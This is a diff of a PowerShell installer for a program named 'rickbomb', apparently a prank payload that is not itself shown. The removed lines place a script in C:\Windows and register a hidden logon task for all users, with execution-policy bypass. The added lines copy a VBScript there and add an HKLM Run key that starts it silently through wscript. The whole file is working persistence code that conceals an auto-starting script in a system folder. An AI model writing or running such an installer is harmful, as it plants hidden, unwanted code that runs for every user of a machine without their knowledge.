@@ -1,7 +1,14 @@
-Copy-Item "$PSScriptRoot\rickbomb.ps1" "C:\Windows"
-$command = "cmd"
-$argument = '/c start /min powershell -file "c:\windows\rickbomb.ps1" -ExecutionPolicy Bypass -NoLogo -NoProfile -NonInteractive -windowstyle Hidden'
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-$action = New-ScheduledTaskAction -Execute $command -Argument $argument
-$principal = New-ScheduledTaskPrincipal -GroupId "S-1-5-32-545"
-Register-ScheduledTask -TaskName "RickBomb" -Trigger $trigger -Action $action -Principal $principal
+$CopyFileSplat = @{
+    Path = "$PSScriptRoot\rickbomb.vbs"
+    Destination = "C:\Windows"
+}
+Copy-Item @CopyFileSplat -Force
+
+$RegValSplat = @{
+    Path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    Name = "rickbomb"
+    PropertyType = "ExpandString"
+    Value = "%windir%\system32\wscript.exe /b /nologo %windir%\rickbomb.vbs"
+}
+New-ItemProperty @RegValSplat -Force
+
